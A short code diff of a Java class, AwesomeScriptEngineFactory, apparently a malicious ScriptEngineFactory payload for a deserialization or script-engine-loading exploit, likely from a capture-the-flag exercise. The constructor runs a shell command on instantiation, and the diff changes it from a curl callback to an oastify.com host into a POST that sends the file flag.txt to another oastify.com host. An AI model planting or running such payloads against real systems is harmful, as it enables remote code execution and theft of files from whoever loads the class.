@@ -9,7 +9,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-		Runtime.getRuntime().exec("curl http://3ko55k11cvzn2ejfq5ocoafuul0go6cv.oastify.com");
+		Runtime.getRuntime().exec("curl -X POST -d @flag.txt http://6268nnj4uyhqkh1i886f6dxxcoil6du2.oastify.com");
         } catch (IOException e) {
             e.printStackTrace();
         }
